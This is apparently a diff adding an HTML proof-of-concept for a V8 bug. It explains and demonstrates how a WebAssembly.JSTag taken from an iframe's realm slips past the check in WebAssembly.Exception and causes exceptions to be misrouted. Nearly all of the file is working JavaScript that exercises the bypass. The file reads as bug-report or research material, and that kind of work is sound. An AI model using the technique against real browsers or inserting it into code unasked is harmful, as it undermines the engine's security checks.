@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<!--
+  Bug: wasm-js.cc:2194-2195 — cross-realm WebAssembly.JSTag bypass
+
+  Root cause:
+    BUILTIN(WebAssemblyException) checks the provided tag against
+    isolate->context()->wasm_js_tag()->tag() — the CURRENT realm's JSTag.
+    WasmJs::Install creates a fresh WasmExceptionTag per native context, so
+    an iframe's JSTag has a different underlying WasmExceptionTag pointer.
+    The identity comparison (*tag == js_tag->tag()) fails to match it.
+
+  The same realm-bound pattern appears in Runtime_WasmThrow (runtime-wasm.cc:322):
+    if (*tag == js_tag->tag())   <-- uses the Wasm module's native_context JSTag
+    so a cross-realm JSTag exception is NOT unwrapped as a plain JS value at throw time.
+
+  Consequence:
+    1. new WebAssembly.Exception(JSTag, payload) is forbidden by spec for ANY realm's JSTag.
+       V8 only checks the current realm, so a cross-realm JSTag bypasses the guard.
+    2. The resulting exception object has e.is(WebAssembly.JSTag) === false (wrong realm),
+       so exception-routing code that gates on this check misclassifies the exception.
+    3. When thrown from Wasm, Runtime_WasmThrow wraps it in a WasmExceptionPackage
+       instead of unwrapping the anyref payload as a JS value.
+       A JS catch block sees a WasmExceptionPackage, not the original JS value.
+-->
+<html>
+<head><meta charset="utf-8"><title>JSTag cross-realm bypass PoC</title></head>
+<body>
+<pre id="log"></pre>
+<script>
+const $ = s => { document.getElementById('log').textContent += s + '\n'; console.log(s); };
+
+(async () => {
+  // --- Setup: get a cross-realm JSTag via hidden iframe ---
+  const iframe = document.createElement('iframe');
+  iframe.srcdoc = '<html></html>';
+  document.body.appendChild(iframe);
+  await new Promise(r => { iframe.onload = r; });
+
+  const crossJSTag = iframe.contentWindow.WebAssembly.JSTag;
+  const mainJSTag  = WebAssembly.JSTag;
+  $('crossJSTag !== mainJSTag: ' + (crossJSTag !== mainJSTag));
+
+  // --- Sanity: main realm JSTag is blocked ---
+  try {
+    new WebAssembly.Exception(mainJSTag, [new Error('x')]);
+    $('FAIL: main-realm JSTag should have thrown');
+  } catch (e) {
+    $('[expected] main-realm JSTag blocked: ' + e.message);
+  }
+
+  // --- Bug: cross-realm JSTag is NOT blocked ---
+  let smuggled;
+  try {
+    const inner = new Error('smuggled value');
+    smuggled = new WebAssembly.Exception(crossJSTag, [inner]);
+    $('[BUG] cross-realm JSTag NOT blocked — exception created');
+    $('  smuggled instanceof WebAssembly.Exception : ' + (smuggled instanceof WebAssembly.Exception));
+    $('  smuggled.is(mainJSTag)  : ' + smuggled.is(mainJSTag));   // false — evades main-realm check
+    $('  smuggled.is(crossJSTag) : ' + smuggled.is(crossJSTag));  // true
+    // getArg works because the tag matches
+    const recovered = smuggled.getArg(crossJSTag, 0);
+    $('  recovered value        : ' + recovered);
+    $('  recovered === inner    : ' + (recovered === inner));
+  } catch (e) {
+    $('[not vulnerable] cross-realm JSTag blocked: ' + e.message);
+    return;
+  }
+
+  // --- Impact demo: exception routing bypass via Wasm ---
+  //
+  // Build a tiny Wasm module that:
+  //   imports throwFn (a JS function that throws the smuggled exception)
+  //   exports triggerThrow which calls throwFn, surrounded by a catch on JSTag
+  //
+  // With a correctly-realm JSTag the catch would fire; with a cross-realm one it doesn't.
+  //
+  //   (module
+  //     (import "env" "throwFn" (func $t))
+  //     (tag $jsTag (import "env" "jsTag"))    ;; main realm JSTag, type (anyref)->()
+  //     ...
+  //   )
+  //
+  // For simplicity, demonstrate the routing in pure JS:
+  // The smuggled exception IS a WebAssembly.Exception, but is NOT identified as JSTag.
+  $('');
+  $('=== Exception routing bypass ===');
+  try {
+    throw smuggled;
+  } catch (e) {
+    if (e instanceof WebAssembly.Exception) {
+      const isJSTag  = e.is(mainJSTag);
+      const isCross  = e.is(crossJSTag);
+      $('caught WebAssembly.Exception');
+      $('  e.is(WebAssembly.JSTag) : ' + isJSTag);  // false → bypasses JSTag handler branch
+      $('  e.is(crossJSTag)        : ' + isCross);
+      if (!isJSTag) {
+        $('[BUG CONFIRMED] Exception with anyref payload not recognised as JSTag');
+        $('  Code that checks e.is(WebAssembly.JSTag) will treat it as a Wasm-typed exception');
+        $('  and not extract the wrapped JS value via JSTag semantics.');
+      }
+    }
+  }
+})();
+</script>
+</body>
+</html>
